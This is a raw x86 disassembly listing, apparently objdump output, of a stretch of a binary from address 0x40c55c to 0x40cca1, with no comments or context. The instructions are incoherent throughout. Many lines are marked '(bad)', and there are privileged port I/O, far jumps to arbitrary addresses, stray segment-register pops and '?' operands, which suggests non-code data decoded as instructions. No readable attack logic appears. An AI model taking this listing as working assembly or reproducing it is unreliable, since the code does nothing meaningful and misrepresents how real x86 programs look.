  40c55c:	adc    cl,bh
  40c55e:	jne    0x40c562
  40c560:	shl    BYTE PTR [esi-0x6b],0x3f
  40c564:	cli    
  40c565:	div    DWORD PTR [edi]
  40c567:	fsub   QWORD PTR [ebx]
  40c569:	cmc    
  40c56a:	inc    edi
  40c56b:	pop    ds
  40c56c:	nop
  40c56d:	les    esp,FWORD PTR [edx+0x56]
  40c570:	pop    edx
  40c571:	adc    al,0x97
  40c573:	add    al,0xf6
  40c575:	inc    eax
  40c576:	and    al,0xa5
  40c578:	or     BYTE PTR [eax+edx*2-0x1a],al
  40c57c:	xor    al,0x4c
  40c57e:	mov    ah,0x78
  40c580:	lock pop ds
  40c582:	out    dx,al
  40c583:	push   0x8dd950a
  40c588:	pushf  
  40c589:	fs jbe 0x40c556
  40c58c:	rcr    BYTE PTR [eax+0x39],0xde
  40c590:	mov    esp,0x9656eaf3
  40c595:	jl     0x40c60b
  40c597:	mov    ebp,0xa50f6e8b
  40c59c:	sub    ah,al
  40c59e:	aas    
  40c59f:	into   
  40c5a0:	lea    eax,[eax+0x5ef34c38]
  40c5a6:	mov    ch,0xa9
  40c5a8:	mov    bh,0x23
  40c5aa:	add    eax,0xb16666ba
  40c5af:	sub    esp,DWORD PTR [esi+0x70]
  40c5b2:	or     bh,BYTE PTR [ebx]
  40c5b4:	jecxz  0x40c5c3
  40c5b6:	dec    eax
  40c5b7:	pop    ebp
  40c5b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c5b9:	adc    eax,ebp
  40c5bb:	and    bl,BYTE PTR [ebp+0xa992c3b]
  40c5c1:	ins    DWORD PTR es:[edi],dx
  40c5c2:	sbb    dl,BYTE PTR [edi-0x68]
  40c5c5:	mov    dl,0xe3
  40c5c7:	push   ebx
  40c5c8:	xor    BYTE PTR [edi],ch
  40c5ca:	aam    0xbb
  40c5cc:	outs   dx,DWORD PTR ds:[esi]
  40c5cd:	adc    al,0x66
  40c5cf:	mov    ebp,0x7e665f81
  40c5d4:	add    BYTE PTR [eax+0x1a],ah
  40c5d7:	mov    gs,WORD PTR [esi-0x4b907e62]
  40c5dd:	scas   al,BYTE PTR es:[edi]
  40c5de:	inc    eax
  40c5df:	cmp    ebp,eax
  40c5e1:	and    cl,0x7c
  40c5e4:	scas   al,BYTE PTR es:[edi]
  40c5e5:	xchg   esi,eax
  40c5e6:	pop    ebp
  40c5e7:	outs   dx,DWORD PTR ds:[esi]
  40c5e8:	or     eax,DWORD PTR [eax]
  40c5ea:	mov    ebp,0xbd7b77ab
  40c5ef:	dec    esp
  40c5f0:	mov    esi,DWORD PTR [di]
  40c5f3:	push   0xfffffff0
  40c5f5:	jmp    0xb7e610d3
  40c5fa:	mov    ds:0xd1ae6e95,al
  40c5ff:	adc    eax,0x5fcabf85
  40c604:	mov    ebp,0x872ccb6a
  40c609:	pop    ss
  40c60a:	xchg   esi,eax
  40c60b:	and    DWORD PTR ds:0x9ea2ae48,esi
  40c611:	call   0x9b87f323
  40c616:	sub    cl,BYTE PTR [ecx+edx*2]
  40c619:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c61a:	mov    eax,ds:0xbb8d4aa2
  40c61f:	mov    al,0xf1
  40c621:	push   ebx
  40c622:	inc    ecx
  40c623:	aad    0xa6
  40c625:	dec    ebp
  40c626:	mov    ecx,0xa42b7479
  40c62b:	or     eax,0x4297095d
  40c630:	xchg   esp,eax
  40c631:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c632:	jne    0x40c67f
  40c634:	xchg   esp,eax
  40c635:	push   esp
  40c636:	aas    
  40c637:	fidiv  DWORD PTR ds:0xfbf24a72
  40c63d:	data16 mov BYTE PTR [ecx],al
  40c640:	push   0xa
  40c642:	ss pusha 
  40c644:	pop    ss
  40c645:	jnp    0x40c5f5
  40c647:	fimul  DWORD PTR ds:0xdc0f84ea
  40c64d:	imul   esp,ebx,0x60
  40c650:	pop    esp
  40c651:	test   BYTE PTR [edx+0x1b47d000],0xeb
  40c658:	adc    eax,0x1b0b214d
  40c65d:	adc    edx,esi
  40c65f:	out    0x61,al
  40c661:	in     al,dx
  40c662:	sar    BYTE PTR [eax],cl
  40c664:	(bad)  
  40c665:	aad    0x7c
  40c667:	adc    eax,0xf892396
  40c66c:	jle    0x40c6d4
  40c66e:	(bad)  
  40c670:	(bad)  [ebx+0x45]
  40c673:	jno    0x40c657
  40c675:	lahf   
  40c676:	push   ss
  40c677:	fdiv   QWORD PTR [edx]
  40c679:	jno    0x40c6d5
  40c67b:	(bad)  
  40c67c:	sbb    ebx,DWORD PTR [ecx+0x697dc802]
  40c682:	imul   ecx,DWORD PTR [edx],0xc
  40c685:	xor    DWORD PTR [edx+0x5f47dda0],ebp
  40c68b:	enter  0x83ff,0x2e
  40c68f:	(bad)  
  40c691:	sbb    cl,bl
  40c693:	test   DWORD PTR [esi],edx
  40c695:	mov    eax,0xb9d2b2db
  40c69a:	or     BYTE PTR [edi],dl
  40c69c:	mov    ch,BYTE PTR [ebx]
  40c69e:	mov    esi,0x9df7dc16
  40c6a3:	int3   
  40c6a4:	lahf   
  40c6a5:	popa   
  40c6a6:	dec    edx
  40c6a7:	inc    edi
  40c6a8:	mov    DWORD PTR [edx],0x875134b4
  40c6ae:	pop    es
  40c6af:	xchg   ebx,eax
  40c6b0:	cdq    
  40c6b1:	fcmovnu st,st(3)
  40c6b3:	aad    0x14
  40c6b5:	loopne 0x40c678
  40c6b7:	retf   
  40c6b8:	or     al,ah
  40c6ba:	cdq    
  40c6bb:	xlat   BYTE PTR ds:[ebx]
  40c6bc:	and    eax,0xeb0caa1
  40c6c1:	les    edx,FWORD PTR [ebx-0x7cddeb61]
  40c6c7:	inc    ecx
  40c6c8:	jmp    0x4b51:0xe53d0827
  40c6cf:	out    dx,eax
  40c6d0:	push   edx
  40c6d1:	cmp    ecx,DWORD PTR [ebx]
  40c6d3:	daa    
  40c6d4:	scas   eax,DWORD PTR es:[edi]
  40c6d5:	js     0x40c661
  40c6d7:	test   al,0xea
  40c6d9:	lods   al,BYTE PTR ds:[esi]
  40c6da:	cdq    
  40c6db:	mov    DWORD PTR [ebp-0x69],esp
  40c6de:	es popa 
  40c6e0:	jne    0x40c734
  40c6e2:	fidivr DWORD PTR [esi-0x29efb391]
  40c6e8:	mov    ?,edi
  40c6ea:	test   al,0xe9
  40c6ec:	inc    edi
  40c6ed:	pop    ebx
  40c6ee:	or     al,0x5f
  40c6f0:	mov    WORD PTR [ebx+esi*2+0x18],?
  40c6f4:	outs   dx,BYTE PTR ds:[esi]
  40c6f5:	jb     0x40c75f
  40c6f7:	and    DWORD PTR ss:[ecx],0x30
  40c6fb:	cs je  0x40c720
  40c6fe:	cdq    
  40c6ff:	and    BYTE PTR [ecx+eax*4-0x2a],ch
  40c703:	mov    es,WORD PTR [edx]
  40c705:	mov    ecx,DWORD PTR [eax]
  40c707:	aad    0xcb
  40c709:	mov    cl,0x86
  40c70b:	inc    eax
  40c70c:	and    esp,edi
  40c70e:	jle    0x40c755
  40c710:	pushf  
  40c711:	inc    edi
  40c712:	jp     0x40c78d
  40c714:	in     al,dx
  40c715:	sar    BYTE PTR [ebp-0x5699335d],1
  40c71b:	jecxz  0x40c6d6
  40c71d:	mov    ds:0xf9651d53,eax
  40c722:	fisub  WORD PTR [eax+0x7cf6338c]
  40c728:	rol    BYTE PTR [ebx+edi*8],cl
  40c72b:	test   BYTE PTR [edi-0x7477d761],cl
  40c731:	sbb    eax,0xb554807b
  40c736:	add    bl,dl
  40c738:	loope  0x40c717
  40c73a:	mov    ds:0x655afc,al
  40c73f:	inc    edi
  40c740:	mov    ecx,0x547c6867
  40c745:	sub    al,0xf5
  40c747:	aam    0x42
  40c749:	mov    dl,0x39
  40c74b:	pop    ds
  40c74c:	fsubrp st(7),st
  40c74e:	dec    edx
  40c74f:	aas    
  40c750:	ja     0x40c7c2
  40c752:	xchg   esp,eax
  40c753:	fild   DWORD PTR [ebp+0x46]
  40c756:	push   0x66
  40c758:	mov    eax,0x339a9622
  40c75d:	gs push 0xdfd2d62
  40c763:	xchg   esi,eax
  40c764:	stos   BYTE PTR es:[edi],al
  40c765:	xchg   edi,eax
  40c766:	push   esi
  40c767:	dec    ebx
  40c768:	iret   
  40c769:	fsubr  DWORD PTR [eax]
  40c76b:	adc    bh,bl
  40c76d:	gs push edi
  40c76f:	in     eax,dx
  40c770:	adc    al,0xcf
  40c772:	add    BYTE PTR [ecx+0x682342b1],al
  40c778:	rcl    BYTE PTR ds:0xacfeee47,cl
  40c77e:	mov    eax,DWORD PTR [edi+0x4]
  40c781:	inc    ebp
  40c782:	mov    ds:0xb5b4ad24,eax
  40c787:	les    ebp,FWORD PTR [edi]
  40c789:	sar    BYTE PTR [ebx+0x5ea3cb5a],0x93
  40c790:	outs   dx,BYTE PTR ds:[esi]
  40c791:	push   ds
  40c792:	push   ds
  40c793:	add    edi,DWORD PTR [edi]
  40c795:	popa   
  40c796:	call   0xccee890b
  40c79b:	scas   al,BYTE PTR es:[edi]
  40c79c:	ficom  DWORD PTR [eax-0x3931bf30]
  40c7a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c7a3:	jbe    0x40c818
  40c7a5:	dec    ecx
  40c7a6:	sub    eax,0x267a0cf8
  40c7ab:	(bad)  
  40c7ac:	sbb    ebx,ecx
  40c7ae:	dec    esi
  40c7af:	mov    ds:0x1b7ceece,eax
  40c7b4:	push   cs
  40c7b5:	push   esi
  40c7b6:	int3   
  40c7b7:	mov    DWORD PTR [esi-0x29cc4866],edx
  40c7bd:	cmp    DWORD PTR [ecx+0xec92bd8],ebp
  40c7c3:	push   ds
  40c7c4:	jbe    0x40c7af
  40c7c6:	(bad)  
  40c7c7:	cmp    bl,dh
  40c7c9:	add    BYTE PTR [ebp+0x6447241a],dh
  40c7cf:	lea    edx,[ebx-0x541bed11]
  40c7d5:	xchg   ebx,eax
  40c7d6:	add    BYTE PTR [eax-0x194d606c],0x4
  40c7dd:	jne    0x40c773
  40c7df:	pusha  
  40c7e0:	lods   eax,DWORD PTR ds:[esi]
  40c7e1:	or     dl,BYTE PTR [eax]
  40c7e3:	neg    DWORD PTR ds:0xb117b11c
  40c7e9:	loope  0x40c7e8
  40c7eb:	pop    es
  40c7ec:	adc    al,0x66
  40c7ee:	dec    ebp
  40c7ef:	mov    bl,0x8d
  40c7f1:	inc    ebx
  40c7f2:	pop    ds
  40c7f3:	fisub  WORD PTR [edx-0x18047a34]
  40c7f9:	int    0xd2
  40c7fb:	pusha  
  40c7fc:	test   al,0x4b
  40c7fe:	fisubr WORD PTR [esi]
  40c800:	fstp   DWORD PTR [ebx-0x2d]
  40c803:	lock jb 0x40c856
  40c806:	pop    ds
  40c807:	sar    BYTE PTR [edx+0x3bf95701],1
  40c80d:	mov    dh,0x75
  40c80f:	inc    edi
  40c810:	adc    DWORD PTR [edx],esi
  40c812:	or     esi,esp
  40c814:	sbb    esi,DWORD PTR [esp+eiz*2]
  40c817:	mov    ebp,0xb6b083dd
  40c81c:	rep ins DWORD PTR es:[edi],dx
  40c81e:	dec    esi
  40c81f:	(bad)  
  40c820:	xor    al,0x7c
  40c822:	hlt    
  40c823:	pop    ds
  40c824:	in     al,dx
  40c825:	out    dx,eax
  40c826:	imul   esi,DWORD PTR [eax],0x1cf9083a
  40c82c:	sbb    DWORD PTR [eax+0x4dd7f255],esi
  40c832:	fnstenv [esi]
  40c834:	xchg   esi,eax
  40c835:	cs jo  0x40c87f
  40c838:	inc    esp
  40c839:	dec    esi
  40c83a:	adc    DWORD PTR [ebx-0x5e],edi
  40c83d:	inc    ecx
  40c83e:	xchg   ecx,eax
  40c83f:	pop    edi
  40c840:	imul   ecx,DWORD PTR [ebx+0x17223f6e],0xffffffd3
  40c847:	cmp    BYTE PTR [edi],cl
  40c849:	xchg   edi,eax
  40c84a:	pop    ebx
  40c84b:	sti    
  40c84c:	je     0x40c89b
  40c84e:	bound  esp,QWORD PTR [edx]
  40c850:	inc    esp
  40c851:	xor    edi,ecx
  40c853:	popa   
  40c854:	js     0x40c867
  40c856:	and    al,dh
  40c858:	push   ss
  40c859:	lds    ecx,FWORD PTR [eax+0x78]
  40c85c:	hlt    
  40c85d:	jle    0x40c819
  40c85f:	inc    esp
  40c860:	push   eax
  40c861:	add    eax,0x29e7580a
  40c866:	imul   esp,DWORD PTR [ebx+0x148aa0ac],0xdda697ef
  40c870:	out    0x56,al
  40c872:	push   ecx
  40c873:	dec    ecx
  40c874:	xor    BYTE PTR [ebx+ebx*2],ch
  40c877:	daa    
  40c878:	pop    es
  40c879:	shl    DWORD PTR [edi-0x78005445],0xf1
  40c880:	cmc    
  40c881:	fist   WORD PTR [edi+0x6c683002]
  40c887:	sub    esp,DWORD PTR [eax+0x66]
  40c88a:	mov    ebx,0x4c5bf20b
  40c88f:	ror    DWORD PTR [ebp+0x1a70b788],cl
  40c895:	xor    BYTE PTR [esi+0x40],0xdc
  40c899:	jno    0x40c8da
  40c89b:	lea    esp,[esi-0x316a3ed3]
  40c8a1:	fdivr  DWORD PTR [ecx-0x56]
  40c8a4:	jb     0x40c8ed
  40c8a6:	(bad)  
  40c8a7:	push   0x37
  40c8a9:	xor    BYTE PTR [edx],bh
  40c8ab:	sbb    DWORD PTR [esi+0x12],0xd7cdec8d
  40c8b2:	fs pop ebx
  40c8b4:	xchg   ebx,eax
  40c8b5:	sbb    cl,BYTE PTR [esi+0x6e]
  40c8b8:	aad    0xa1
  40c8ba:	sub    al,0xc1
  40c8bc:	dec    ecx
  40c8bd:	sub    DWORD PTR [ecx+0x0],ebp
  40c8c0:	xlat   BYTE PTR ds:[ebx]
  40c8c1:	test   DWORD PTR [edx-0x38f1093],edx
  40c8c7:	or     cl,BYTE PTR [edx]
  40c8c9:	push   edx
  40c8ca:	ss call 0x7619:0xf5dbdabe
  40c8d2:	and    BYTE PTR [ebx-0x364ad5c5],0xb7
  40c8d9:	xor    ch,0x8
  40c8dc:	cmp    esi,edi
  40c8de:	loopne 0x40c878
  40c8e0:	xor    al,0xa5
  40c8e2:	cdq    
  40c8e3:	push   ecx
  40c8e4:	mul    DWORD PTR [ebp-0x5b]
  40c8e7:	or     al,bh
  40c8e9:	mov    edx,DWORD PTR [eax]
  40c8eb:	push   ds
  40c8ec:	scas   al,BYTE PTR es:[edi]
  40c8ed:	inc    esi
  40c8ee:	enter  0x1169,0x5e
  40c8f2:	push   0xc54c38c1
  40c8f7:	jno    0x40c8c2
  40c8f9:	xor    BYTE PTR [ecx+0x58],bl
  40c8fc:	jg     0x40c958
  40c8fe:	xchg   ebp,eax
  40c8ff:	test   al,bl
  40c901:	leave  
  40c902:	push   0x399181cb
  40c907:	loope  0x40c910
  40c909:	ret    0xe957
  40c90c:	aaa    
  40c90d:	cmp    ebp,0x45dea31a
  40c913:	in     eax,0xc4
  40c915:	xchg   edi,eax
  40c916:	fbstp  TBYTE PTR [esi-0x19b9b4d5]
  40c91c:	sub    eax,0x2b670744
  40c921:	add    DWORD PTR [edi-0x78],eax
  40c924:	mov    esi,edi
  40c926:	fisttp DWORD PTR ds:[esi]
  40c929:	fwait
  40c92a:	ret    
  40c92b:	pop    edx
  40c92c:	icebp  
  40c92d:	out    dx,al
  40c92e:	sbb    BYTE PTR [esi-0x2c57a8bf],ah
  40c934:	test   BYTE PTR [eax],al
  40c936:	adc    BYTE PTR [ebx-0x4b],dh
  40c939:	lahf   
  40c93a:	test   DWORD PTR [edx],0x1f91a952
  40c940:	lds    edi,FWORD PTR [ebp-0x769cb0a5]
  40c946:	lds    edi,FWORD PTR [ebx-0x4c1204c]
  40c94c:	int3   
  40c94d:	aam    0xaa
  40c94f:	out    dx,eax
  40c950:	cli    
  40c951:	and    al,0x31
  40c953:	sub    eax,0x30537ccb
  40c958:	and    DWORD PTR ds:0xb3a44e63,ebp
  40c95e:	mov    WORD PTR [esi],?
  40c960:	imul   esp,DWORD PTR [ebx],0x2070d75f
  40c966:	xlat   BYTE PTR cs:[ebx]
  40c968:	jo     0x40c98a
  40c96a:	xor    BYTE PTR [esi],0xbe
  40c96d:	lods   eax,DWORD PTR ds:[esi]
  40c96e:	xchg   BYTE PTR [edi],cl
  40c970:	(bad)  
  40c971:	aad    0x6b
  40c973:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c974:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c975:	out    dx,al
  40c976:	jbe    0x40c971
  40c978:	sar    cl,0x18
  40c97b:	xchg   ecx,eax
  40c97c:	pavgw  mm0,mm4
  40c97f:	data16 stos BYTE PTR es:[edi],al
  40c981:	mov    ch,0x3a
  40c983:	jne    0x40c9d8
  40c985:	jle    0x40c9fe
  40c987:	lock add al,0x76
  40c98a:	xchg   DWORD PTR [ecx+eiz*4-0x61],ebx
  40c98e:	not    BYTE PTR [ebx+edx*1+0x479ed430]
  40c995:	pop    esp
  40c996:	and    DWORD PTR [ecx-0x3ea99196],esp
  40c99c:	adc    bl,BYTE PTR [eax+0x45f2acce]
  40c9a2:	or     DWORD PTR [ecx],esp
  40c9a4:	jns    0x40c93e
  40c9a6:	shl    esp,1
  40c9a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c9a9:	mov    ch,0xf
  40c9ab:	pop    ecx
  40c9ac:	dec    edi
  40c9ad:	jmp    0x40c9b8
  40c9af:	push   esp
  40c9b0:	pushf  
  40c9b1:	fidivr WORD PTR [eax]
  40c9b3:	clc    
  40c9b4:	ins    BYTE PTR es:[edi],dx
  40c9b5:	and    eax,0x391c9dab
  40c9ba:	xlat   BYTE PTR ds:[ebx]
  40c9bb:	js     0x40ca3a
  40c9bd:	sub    DWORD PTR ds:[ebx],0x3607270b
  40c9c4:	or     ebp,DWORD PTR [ebx+0x149fe85d]
  40c9ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c9cb:	fsub   QWORD PTR [ebx]
  40c9cd:	in     eax,dx
  40c9ce:	ja     0x40ca0d
  40c9d0:	mov    WORD PTR [ecx+0x17e77a99],ds
  40c9d6:	ss xor eax,0x995129b7
  40c9dc:	mov    ebp,0xc8e73e40
  40c9e1:	pop    ebp
  40c9e2:	push   edi
  40c9e3:	cmp    bl,BYTE PTR [ebp+0x28a2502f]
  40c9e9:	mov    eax,esp
  40c9eb:	call   0x57d9c98
  40c9f0:	mov    ds:0xdc855e24,al
  40c9f5:	jecxz  0x40c9c6
  40c9f7:	mov    ebp,0x424f6ba8
  40c9fc:	fdivr  DWORD PTR [edi+0x48]
  40c9ff:	add    eax,0xa20cb617
  40ca04:	xchg   edx,eax
  40ca05:	jae    0x40c992
  40ca07:	test   BYTE PTR [ebx+0x23],cl
  40ca0a:	fs jle 0x40ca40
  40ca0d:	retf   0x64a9
  40ca10:	cli    
  40ca11:	fucomp st(7)
  40ca13:	mov    edi,0x90ee5002
  40ca18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca19:	fwait
  40ca1a:	fs out 0xb9,eax
  40ca1d:	iret   
  40ca1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca1f:	adc    al,0x7c
  40ca21:	cmp    eax,0x7908c0a9
  40ca26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca27:	sar    BYTE PTR [eax],0x90
  40ca2a:	jb     0x40ca9b
  40ca2c:	outs   dx,BYTE PTR ds:[esi]
  40ca2d:	arpl   WORD PTR [edi+0x664d57f9],dx
  40ca33:	retf   0x1ff8
  40ca36:	lods   eax,DWORD PTR ds:[esi]
  40ca37:	jge    0x40ca03
  40ca39:	test   esi,esp
  40ca3b:	(bad)  
  40ca3c:	(bad)  
  40ca3d:	test   eax,0xa25372cb
  40ca42:	dec    ecx
  40ca43:	mov    eax,0x21d97f81
  40ca48:	in     al,0x6d
  40ca4a:	loop   0x40ca8d
  40ca4c:	mov    eax,0x8f3976c1
  40ca51:	repnz ror DWORD PTR [ebx],1
  40ca54:	adc    bl,BYTE PTR [edx+0x6cd90305]
  40ca5a:	pop    edi
  40ca5b:	lods   eax,DWORD PTR ds:[esi]
  40ca5c:	xor    al,0x96
  40ca5e:	pop    ds
  40ca5f:	xchg   edi,eax
  40ca60:	leave  
  40ca61:	call   0x308ead9f
  40ca66:	xor    DWORD PTR fs:[ebp+0x0],eax
  40ca6a:	stc    
  40ca6b:	mov    ebp,0x82a3bf56
  40ca70:	jmp    0x40cacb
  40ca72:	shr    DWORD PTR [eax+edx*2],1
  40ca75:	cmp    DWORD PTR [esi+0x2e582942],esp
  40ca7b:	inc    ecx
  40ca7c:	pusha  
  40ca7d:	mov    esi,0xe5a1b961
  40ca82:	outs   dx,DWORD PTR ds:[esi]
  40ca83:	pushf  
  40ca84:	pop    esp
  40ca85:	daa    
  40ca86:	add    al,BYTE PTR [esi-0x5c63c90]
  40ca8c:	mov    cl,0xaa
  40ca8e:	add    eax,0x7904464a
  40ca93:	cld    
  40ca94:	jmp    0xf416:0x6c36d58a
  40ca9b:	scas   al,BYTE PTR es:[edi]
  40ca9c:	or     eax,0x4f7248ee
  40caa1:	nop
  40caa2:	mov    bl,0x79
  40caa4:	pop    ds
  40caa5:	and    DWORD PTR [ecx-0x67],esp
  40caa8:	sub    DWORD PTR [esi-0x34afffed],edi
  40caae:	push   ss
  40caaf:	mov    ax,ds:0x9b6378ea
  40cab5:	bound  edx,QWORD PTR [esi-0x45]
  40cab8:	mov    edx,0x2f305b56
  40cabd:	mov    DWORD PTR [eax],ecx
  40cabf:	int3   
  40cac0:	jmp    0x40cab1
  40cac2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cac3:	sub    dh,dl
  40cac5:	or     eax,0x5104c501
  40caca:	cmp    dl,BYTE PTR [ecx]
  40cacc:	iret   
  40cacd:	sti    
  40cace:	pop    esp
  40cacf:	out    0x57,eax
  40cad1:	push   ds
  40cad2:	test   al,0x43
  40cad4:	cmp    BYTE PTR [eax-0x4b992c70],cl
  40cada:	sti    
  40cadb:	shr    DWORD PTR [ecx-0x53],cl
  40cade:	ins    BYTE PTR es:[edi],dx
  40cadf:	fdivr  QWORD PTR [ecx]
  40cae1:	cmp    DWORD PTR [ecx-0x51],ebp
  40cae4:	dec    edi
  40cae5:	fidiv  WORD PTR [ebx-0x4d]
  40cae8:	rep outs dx,BYTE PTR ds:[esi]
  40caea:	push   eax
  40caeb:	mov    ecx,0x8300218b
  40caf0:	frstor [edi+0xa]
  40caf3:	mov    ah,0xfc
  40caf5:	outs   dx,DWORD PTR ds:[esi]
  40caf6:	xor    al,0xf3
  40caf8:	fs cmp eax,0x18d92664
  40cafe:	sub    al,0x35
  40cb00:	mov    esp,0xb800e659
  40cb05:	and    cl,0x91
  40cb08:	xlat   BYTE PTR ds:[ebx]
  40cb09:	sub    BYTE PTR [eax-0x35],cl
  40cb0c:	pop    es
  40cb0d:	or     al,0x4c
  40cb0f:	mov    esp,0x183221d8
  40cb14:	lods   eax,DWORD PTR ds:[esi]
  40cb15:	shr    dh,0x33
  40cb18:	mov    ds:0xa47a3355,al
  40cb1d:	fsub   st,st(2)
  40cb1f:	mov    al,0x81
  40cb21:	enter  0xe8f5,0x25
  40cb25:	(bad)  
  40cb26:	xor    eax,0xa24decc3
  40cb2b:	aam    0xa4
  40cb2d:	(bad)  
  40cb2e:	xor    ecx,ebp
  40cb30:	aas    
  40cb31:	push   ecx
  40cb32:	scas   eax,DWORD PTR es:[edi]
  40cb33:	adc    DWORD PTR [eax],0x158b4e26
  40cb39:	cmp    BYTE PTR [esi],dh
  40cb3b:	jp     0x40cb6d
  40cb3d:	inc    esp
  40cb3e:	sub    edx,DWORD PTR [esi]
  40cb40:	cmp    al,0xd8
  40cb42:	mov    al,0x52
  40cb44:	xor    al,0xe1
  40cb46:	int    0xe3
  40cb48:	stc    
  40cb49:	pop    esi
  40cb4a:	xchg   bl,bh
  40cb4c:	in     eax,0xf6
  40cb4e:	sbb    eax,0x7f92df75
  40cb53:	aad    0x40
  40cb55:	mov    ch,0x46
  40cb57:	cmp    eax,0x97d68c42
  40cb5c:	sub    DWORD PTR [eax],esp
  40cb5e:	fwait
  40cb5f:	pop    ebx
  40cb60:	ins    DWORD PTR es:[edi],dx
  40cb61:	push   esi
  40cb62:	jbe    0x40cb52
  40cb64:	mov    edi,0x81a75dec
  40cb69:	loop   0x40cbbf
  40cb6b:	jo     0x40cb82
  40cb6d:	ins    BYTE PTR es:[edi],dx
  40cb6e:	push   eax
  40cb6f:	dec    ecx
  40cb70:	pop    ss
  40cb71:	xor    DWORD PTR [edi-0x3b6433b9],esp
  40cb77:	(bad)  
  40cb79:	fstp   DWORD PTR [esi-0x40]
  40cb7c:	xchg   esp,eax
  40cb7d:	pop    ds
  40cb7e:	mov    ebx,0x66868c19
  40cb83:	push   ds
  40cb84:	ins    DWORD PTR es:[edi],dx
  40cb85:	test   eax,0x590219a
  40cb8a:	cld    
  40cb8b:	into   
  40cb8c:	rcr    BYTE PTR [esi],1
  40cb8e:	jbe    0x40cb62
  40cb90:	call   0xb4de05a9
  40cb95:	retf   
  40cb96:	mov    bh,0x32
  40cb98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb99:	sub    dl,BYTE PTR [ebx]
  40cb9b:	hlt    
  40cb9c:	sub    eax,0xa8d8e41e
  40cba1:	dec    ecx
  40cba2:	jecxz  0x40cb8a
  40cba4:	jg     0x40cb44
  40cba6:	push   ebp
  40cba7:	jl     0x40cb9d
  40cba9:	bound  esp,QWORD PTR [eax+ebp*1-0x17]
  40cbad:	mov    eax,ds:0xed61565
  40cbb2:	xor    eax,0x1c041b46
  40cbb7:	mov    DWORD PTR [eax+0x5a],ebx
  40cbba:	cdq    
  40cbbb:	xor    bh,BYTE PTR [ebp-0x42c92de]
  40cbc1:	jp     0x40cba4
  40cbc3:	add    eax,0xcb7d20cd
  40cbc8:	mov    ah,0x4
  40cbca:	jmp    0xfde2:0x9764d422
  40cbd1:	cmp    edi,DWORD PTR [ebp+0x65]
  40cbd4:	ss pop edx
  40cbd6:	lock pop ebx
  40cbd8:	push   edx
  40cbd9:	leave  
  40cbda:	jmp    0x26c1a444
  40cbdf:	push   ecx
  40cbe0:	add    DWORD PTR [edi-0x465ab077],esi
  40cbe6:	pusha  
  40cbe7:	pop    edi
  40cbe8:	xor    ebp,edx
  40cbea:	fwait
  40cbeb:	xor    DWORD PTR [eax],edx
  40cbed:	pushf  
  40cbee:	not    BYTE PTR [edx-0x2cf3973a]
  40cbf4:	(bad)  
  40cbf5:	pushf  
  40cbf6:	stos   DWORD PTR es:[edi],eax
  40cbf7:	sub    al,0x94
  40cbf9:	mov    edx,DWORD PTR [ecx+ebp*8]
  40cbfc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cbfd:	sahf   
  40cbfe:	push   edx
  40cbff:	ins    BYTE PTR es:[edi],dx
  40cc00:	iret   
  40cc01:	lds    edi,FWORD PTR [eax+0x3d3b69a9]
  40cc07:	daa    
  40cc08:	push   ecx
  40cc09:	xor    bh,bl
  40cc0b:	adc    cl,dh
  40cc0d:	xchg   esi,eax
  40cc0e:	pop    edi
  40cc0f:	cmp    DWORD PTR [ebx+esi*8+0x1b],ebx
  40cc13:	cmp    edx,DWORD PTR [edi-0x42b268f1]
  40cc19:	xlat   BYTE PTR ds:[ebx]
  40cc1a:	(bad)  
  40cc1b:	mov    dl,0xc5
  40cc1d:	in     eax,dx
  40cc1e:	push   esi
  40cc1f:	mov    DWORD PTR [esi+ecx*1],ebx
  40cc22:	push   ebp
  40cc23:	vunpckhpd ymm6,ymm3,YMMWORD PTR [ecx+0x68]
  40cc28:	ret    
  40cc29:	mov    edi,0x7de02fa7
  40cc2e:	retf   0x431f
  40cc31:	rcl    BYTE PTR [esi+0x590a383],1
  40cc37:	xchg   esi,eax
  40cc38:	lods   al,BYTE PTR ds:[esi]
  40cc39:	in     eax,dx
  40cc3a:	repz dec ebp
  40cc3c:	push   cs
  40cc3d:	xor    edi,edx
  40cc3f:	jmp    0x40cc89
  40cc41:	cmc    
  40cc42:	mov    dh,BYTE PTR [ecx]
  40cc44:	adc    ch,dh
  40cc46:	fdivr  QWORD PTR [ecx+0x7b]
  40cc49:	push   ss
  40cc4a:	sar    ebx,1
  40cc4c:	into   
  40cc4d:	aad    0x60
  40cc4f:	xor    DWORD PTR [edx-0x50fdcefb],ebx
  40cc55:	ror    bh,1
  40cc57:	mov    bh,0xb6
  40cc59:	scas   eax,DWORD PTR es:[edi]
  40cc5a:	pop    edi
  40cc5b:	leave  
  40cc5c:	mov    ah,BYTE PTR [ebp+0x38603d7f]
  40cc62:	adc    esi,ebp
  40cc64:	xchg   ebx,eax
  40cc65:	pop    ebp
  40cc66:	inc    edx
  40cc67:	xor    BYTE PTR [ebp+0x79],bh
  40cc6a:	aam    0x18
  40cc6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc6d:	cmp    bh,BYTE PTR [edx]
  40cc6f:	mov    ecx,0x466f7b42
  40cc74:	sub    cl,BYTE PTR [ebp+0x3e06d079]
  40cc7a:	adc    al,0x77
  40cc7c:	sub    eax,0x2397dc31
  40cc81:	cmp    eax,ebp
  40cc83:	addr16 int3 
  40cc85:	(bad)  [esi]
  40cc87:	adc    ch,BYTE PTR [ecx-0x39e8bbc1]
  40cc8d:	in     eax,0x84
  40cc8f:	cvtdq2ps xmm0,XMMWORD PTR [edx+0x1d]
  40cc93:	rol    BYTE PTR [esi-0x1ef7d148],1
  40cc99:	sbb    DWORD PTR [eax-0x72],esp
  40cc9c:	jnp    0x40cc4e
  40cc9e:	jg     0x40cc43
  40cca0:	push   ebp
  40cca1:	and    esi,esp
